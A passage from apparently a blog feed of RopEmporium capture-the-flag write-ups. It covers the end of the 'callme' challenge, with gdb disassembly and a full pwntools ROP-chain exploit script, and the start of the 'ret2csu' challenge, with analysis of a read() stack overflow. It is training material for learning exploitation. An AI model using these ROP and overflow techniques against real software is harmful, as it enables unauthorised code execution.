<p><strong>What are gadgets?</strong></p>
<p>Gadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.</p>
<p>The example of the <strong>pop rdi,pop rsi,pop rdx, ret</strong> gadget is shown in image below.</p>
<p><img data-src="/images/ropemporium/poprdi_callme.png"><br>Next is determine addresses of <code>callme_one</code>, <code>callme_two</code>, <code>callme_three</code> functions using gdb.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) info functions
All defined functions:
Non<span class="token operator">-</span>debugging symbols:
<span class="token number">0x00000000004006a8</span>  _init
<span class="token number">0x00000000004006d0</span>  puts@plt
<span class="token number">0x00000000004006e0</span>  printf@plt
<span class="token number">0x00000000004006f0</span>  callme_three@plt
<span class="token number">0x0000000000400700</span>  memset@plt
<span class="token number">0x0000000000400710</span>  read@plt
<span class="token number">0x0000000000400720</span>  callme_one@plt
<span class="token number">0x0000000000400730</span>  setvbuf@plt
<span class="token number">0x0000000000400740</span>  callme_two@plt
<span class="token number">0x0000000000400750</span>  exit@plt
<span class="token number">0x0000000000400760</span>  _start
<span class="token number">0x0000000000400790</span>  _dl_relocate_static_pie
<span class="token number">0x00000000004007a0</span>  deregister_tm_clones
<span class="token number">0x00000000004007d0</span>  register_tm_clones
<span class="token number">0x0000000000400810</span>  __do_<span class="token keyword">global_dtors_aux</span>
<span class="token number">0x0000000000400840</span>  frame_dummy
<span class="token number">0x0000000000400847</span>  main
<span class="token number">0x0000000000400898</span>  pwnme
<span class="token number">0x00000000004008f2</span>  usefulFunction
<span class="token number">0x000000000040093c</span>  usefulGadgets
<span class="token number">0x0000000000400940</span>  __libc_csu_init
<span class="token number">0x00000000004009b0</span>  __libc_csu_fini
<span class="token number">0x00000000004009b4</span>  _fini
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the <strong>callme</strong> binary does PLT relocations of the functions of callme, disassemble the target shared library <strong>libcallme.so</strong> as shown below.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token label function">vx@archie:</span>callme<span class="token operator">$</span> gdb <span class="token operator">-</span>q libcallme.so
Reading symbols from libcallme.so...
(No debugging symbols found in libcallme.so)
(gdb) disas callme_one
Dump of assembler code for function callme_one:
   <span class="token number">0x000000000000081a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x000000000000081b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x000000000000081e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x30</span>
   <span class="token number">0x0000000000000822</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	mov    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">]</span>,<span class="token register variable">rdi</span>
   <span class="token number">0x0000000000000826</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span>:	mov    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>,<span class="token register variable">rsi</span>
   <span class="token number">0x000000000000082a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>:	mov    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">]</span>,<span class="token register variable">rdx</span>
   <span class="token number">0x000000000000082e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span>:	movabs <span class="token register variable">rax</span>,<span class="token number">0xdeadbeefdeadbeef</span>
   <span class="token number">0x0000000000000838</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span>:	cmp    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">]</span>,<span class="token register variable">rax</span>
   <span class="token number">0x000000000000083c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">34</span><span class="token operator">></span>:	jne    <span class="token number">0x912</span> <span class="token operator">&lt;</span>callme_one<span class="token operator">+</span><span class="token number">248</span><span class="token operator">></span>
   <span class="token number">0x0000000000000842</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span>:	movabs <span class="token register variable">rax</span>,<span class="token number">0xcafebabecafebabe</span>
   <span class="token number">0x000000000000084c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span>:	cmp    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>,<span class="token register variable">rax</span>
   <span class="token number">0x0000000000000850</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">54</span><span class="token operator">></span>:	jne    <span class="token number">0x912</span> <span class="token operator">&lt;</span>callme_one<span class="token operator">+</span><span class="token number">248</span><span class="token operator">></span>
   <span class="token number">0x0000000000000856</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span>:	movabs <span class="token register variable">rax</span>,<span class="token number">0xd00df00dd00df00d</span>
   <span class="token number">0x0000000000000860</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">></span>:	cmp    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">]</span>,<span class="token register variable">rax</span>
   <span class="token number">0x0000000000000864</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">></span>:	jne    <span class="token number">0x912</span> <span class="token operator">&lt;</span>callme_one<span class="token operator">+</span><span class="token number">248</span><span class="token operator">></span>
   <span class="token number">0x000000000000086a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span>:	mov    QWORD PTR <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token operator">]</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000000872</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span>:	lea    <span class="token register variable">rsi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x32f</span><span class="token operator">]</span>        # <span class="token number">0xba8</span>
   <span class="token number">0x0000000000000879</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">95</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x32a</span><span class="token operator">]</span>        # <span class="token number">0xbaa</span>
   <span class="token number">0x0000000000000912</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">248</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x301</span><span class="token operator">]</span>        # <span class="token number">0xc1a</span>
   <span class="token number">0x0000000000000919</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">255</span><span class="token operator">></span>:	call   <span class="token number">0x6c0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x000000000000091e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">260</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x1</span>
   <span class="token number">0x0000000000000923</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">265</span><span class="token operator">></span>:	call   <span class="token number">0x720</span> <span class="token operator">&lt;</span>exit@plt<span class="token operator">></span>
   <span class="token number">0x0000000000000928</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">270</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000000929</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">271</span><span class="token operator">></span>:	leave
   <span class="token number">0x000000000000092a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">272</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the disassembly code above, the function compares the arguments passed to the callme_one function. If string values are not equal to values passed to the <code>rdi</code>, <code>rsi</code> and <code>rdx</code> registers the program exits, otherwise we get a flag.</p>
<p>From previous knowledge of solving other challenges, we need to overwrite the return address with controlled pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.</p>
<p>Fully working rop chain code.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn

<span class="token comment">#Various setting for pwntools</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"latin-1"</span>
pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>

io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">'./callme'</span><span class="token punctuation">)</span>

pop_rdi_rsi_rdx <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0040093c</span><span class="token punctuation">)</span>  <span class="token comment">#pop rdi; pop rsi; pop rdx; ret gadget</span>
arg1 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">)</span>
arg2 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xcafebabecafebabe</span><span class="token punctuation">)</span>
arg3 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0xd00df00dd00df00d</span><span class="token punctuation">)</span>

callme_one_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400720</span><span class="token punctuation">)</span>
callme_two_addr <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400740</span><span class="token punctuation">)</span>
callme_three_addr <span class="token operator">=</span>pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00000000004006f0</span><span class="token punctuation">)</span>

<span class="token comment">#call the callme_one function</span>
callme_one <span class="token operator">=</span> pop_rdi_rsi_rdx
callme_one <span class="token operator">+=</span> arg1
callme_one <span class="token operator">+=</span> arg2
callme_one <span class="token operator">+=</span> arg3
callme_one <span class="token operator">+=</span> callme_one_addr

<span class="token comment">#callme_two function</span>
callme_two <span class="token operator">=</span> pop_rdi_rsi_rdx
callme_two <span class="token operator">+=</span> arg1
callme_two <span class="token operator">+=</span> arg2
callme_two  <span class="token operator">+=</span> arg3
callme_two <span class="token operator">+=</span> callme_two_addr

<span class="token comment">#callme_three function</span>
callme_three <span class="token operator">=</span> pop_rdi_rsi_rdx
callme_three <span class="token operator">+=</span> arg1
callme_three <span class="token operator">+=</span> arg2
callme_three <span class="token operator">+=</span> arg3
callme_three <span class="token operator">+=</span> callme_three_addr

payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span><span class="token number">32</span>   <span class="token comment">#fill the buffer</span>
payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">8</span>  <span class="token comment">#overwrite the rbp</span>
payload <span class="token operator">+=</span> callme_one
payload <span class="token operator">+=</span> callme_two
payload <span class="token operator">+=</span> callme_three

io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Successful execution of the above code, correct flag is printed.</p>
<p><img data-src="/images/ropemporium/callme-flag.png"></p>
]]></content>
      <tags>
        <tag>ropemporium</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>RopEmporium ret2csu challenge</title>
    <url>/2021/12/20/ROP-ret2csu/</url>
    <content><![CDATA[<p>We’re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them?<br>The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website <a href="https://ropemporium.com/">Ropemporium</a></p>
<span id="more"></span>

<p>After downloading the binary, check enabled protections and mitigation’s. Only <strong>NX</strong> and Partial RELRO protections are turned on as shown below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>First is finding the vulnerability in the binary that will enable us to subvert program execution control flow. From the disassembly of main function we are only calling <strong>pwnme</strong> function.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas main
Dump of assembler code for function main:
   <span class="token number">0x0000000000400607</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400608</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x000000000040060b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	call   <span class="token number">0x400500</span> <span class="token operator">&lt;</span>pwnme@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400610</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000400615</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400616</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span>:	ret
End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The function reference the <code>got table</code> in order to load the actual address of <code>pwnme</code> function from <strong>libret2csu.so</strong> library after the first call.</p>
<h2 id="pwnme-Function-Disassembly"><a href="#pwnme-Function-Disassembly" class="headerlink" title="pwnme Function Disassembly"></a>pwnme Function Disassembly</h2><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas pwnme
Dump of assembler code for function pwnme:
  <span class="token number">0x000000000000093a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
  <span class="token number">0x000000000000093b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
  <span class="token number">0x000000000000093e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
  <span class="token number">0x0000000000000942</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x201697</span><span class="token operator">]</span>        # <span class="token number">0x201fe0</span>
  <span class="token number">0x0000000000000949</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">]</span>
  <span class="token number">0x000000000000094c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span>:	mov    <span class="token register variable">ecx</span>,<span class="token number">0x0</span>
  <span class="token number">0x0000000000000951</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">23</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x2</span>
  <span class="token number">0x0000000000000956</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
  <span class="token number">0x000000000000095b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">33</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
  <span class="token number">0x000000000000095e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span>:	call   <span class="token number">0x820</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span>
  <span class="token number">0x0000000000000963</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">41</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x31e</span><span class="token operator">]</span>        # <span class="token number">0xc88</span>
  <span class="token number">0x000000000000096a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
  <span class="token number">0x000000000000096f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">53</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x32a</span><span class="token operator">]</span>        # <span class="token number">0xca0</span>
  <span class="token number">0x0000000000000976</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
  <span class="token number">0x000000000000097b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">65</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
  <span class="token number">0x000000000000097f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">69</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
  <span class="token number">0x0000000000000984</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
  <span class="token number">0x0000000000000989</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
  <span class="token number">0x000000000000098c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">></span>:	call   <span class="token number">0x7d0</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">></span>
  <span class="token number">0x0000000000000991</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x310</span><span class="token operator">]</span>        # <span class="token number">0xca8</span>
  <span class="token number">0x0000000000000998</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">></span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
  <span class="token number">0x000000000000099d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x36e</span><span class="token operator">]</span>        # <span class="token number">0xd12</span>
  <span class="token number">0x00000000000009a4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">106</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
  <span class="token number">0x00000000000009a9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span>:	call   <span class="token number">0x7c0</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
  <span class="token number">0x00000000000009ae</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">116</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
  <span class="token number">0x00000000000009b2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x200</span>
  <span class="token number">0x00000000000009b7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">125</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
  <span class="token number">0x00000000000009ba</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
  <span class="token number">0x00000000000009bf</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">133</span><span class="token operator">></span>:	call   <span class="token number">0x7f0</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
  <span class="token number">0x00000000000009c4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">138</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x34a</span><span class="token operator">]</span>        # <span class="token number">0xd15</span>
  <span class="token number">0x00000000000009cb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">145</span><span class="token operator">></span>:	call   <span class="token number">0x7a0</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
  <span class="token number">0x00000000000009d0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span>:	nop
  <span class="token number">0x00000000000009d1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">151</span><span class="token operator">></span>:	leave
  <span class="token number">0x00000000000009d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">152</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size <code>32bytes</code> and reading <strong>0x200</strong> from the standard input file descriptor, which is more than the buffer size.<br>The c equivalent of the above vulnerability is,</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span> #reading <span class="token number">0x200</span> from the <span class="token constant">stdin</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>For exploitation purpose, goal is to control the return address of <code>pwnme</code> function and redirect execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.</p>
<p><img data-src="/images/ropemporium/stack.png" alt="ret control"></p>
<p>From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the <strong>NX</strong> execution is enabled on the binary, we can&#96;t use the shellcode techniques, therefore we use other methods such a ropping.</p>
<h2 id="libc-csu-init-Disassembly"><a href="#libc-csu-init-Disassembly" class="headerlink" title="libc_csu_init Disassembly"></a><strong>libc_csu_init</strong> Disassembly</h2><p>Below is the disassembled code for <strong>__libc_csu_init</strong> section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token number">0000000000400640</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:
  <span class="token number">400640</span>:	<span class="token number">41</span> <span class="token number">57</span>                	push   <span class="token register variable">r15</span>
  <span class="token number">400642</span>:	<span class="token number">41</span> <span class="token number">56</span>                	push   <span class="token register variable">r14</span>
  <span class="token number">400644</span>:	<span class="token number">49</span> <span class="token number">89</span> d7             	mov    <span class="token register variable">r15</span>,<span class="token register variable">rdx</span>
  <span class="token number">400647</span>:	<span class="token number">41</span> <span class="token number">55</span>                	push   <span class="token register variable">r13</span>
  <span class="token number">400649</span>:	<span class="token number">41</span> <span class="token number">54</span>                	push   <span class="token register variable">r12</span>
  40064b:	4c <span class="token number">8d</span> <span class="token number">25</span> 9e <span class="token number">07</span> <span class="token number">20</span> <span class="token number">00</span> 	lea    <span class="token register variable">r12</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x20079e</span><span class="token operator">]</span>        # 600df0 <span class="token operator">&lt;</span>__frame_dummy_init_array_entry<span class="token operator">></span>
  <span class="token number">400652</span>:	<span class="token number">55</span>                   	push   <span class="token register variable">rbp</span>
  <span class="token number">400653</span>:	<span class="token number">48</span> <span class="token number">8d</span> <span class="token number">2d</span> 9e <span class="token number">07</span> <span class="token number">20</span> <span class="token number">00</span> 	lea    <span class="token register variable">rbp</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x20079e</span><span class="token operator">]</span>        # 600df8 <span class="token operator">&lt;</span>__do_<span class="token keyword">global_dtors_aux_fini_array_entry></span>
  40065a:	<span class="token number">53</span>                   	push   <span class="token register variable">rbx</span>
  40065b:	<span class="token number">41</span> <span class="token number">89</span> fd             	mov    <span class="token register variable">r13d</span>,<span class="token register variable">edi</span>
  40065e:	<span class="token number">49</span> <span class="token number">89</span> f6             	mov    <span class="token register variable">r14</span>,<span class="token register variable">rsi</span>
  <span class="token number">400661</span>:	4c <span class="token number">29</span> e5             	sub    <span class="token register variable">rbp</span>,<span class="token register variable">r12</span>
  <span class="token number">400664</span>:	<span class="token number">48</span> <span class="token number">83</span> ec <span class="token number">08</span>          	sub    <span class="token register variable">rsp</span>,<span class="token number">0x8</span>
  <span class="token number">400668</span>:	<span class="token number">48</span> c1 fd <span class="token number">03</span>          	sar    <span class="token register variable">rbp</span>,<span class="token number">0x3</span>
  40066c:	e8 5f fe ff ff       	call   4004d0 <span class="token operator">&lt;</span>_init<span class="token operator">></span>
  <span class="token number">400671</span>:	<span class="token number">48</span> <span class="token number">85</span> ed             	test   <span class="token register variable">rbp</span>,<span class="token register variable">rbp</span>
  <span class="token number">400674</span>:	<span class="token number">74</span> <span class="token number">20</span>                	je     <span class="token number">400696</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0x56</span><span class="token operator">></span>
  <span class="token number">400676</span>:	<span class="token number">31</span> db                	xor    <span class="token register variable">ebx</span>,<span class="token register variable">ebx</span>
  <span class="token number">400678</span>:	0f 1f <span class="token number">84</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> 	nop    DWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token register variable">rax</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
  40067f:	<span class="token number">00</span>
  <span class="token number">400680</span>:	4c <span class="token number">89</span> fa             	mov    <span class="token register variable">rdx</span>,<span class="token register variable">r15</span>
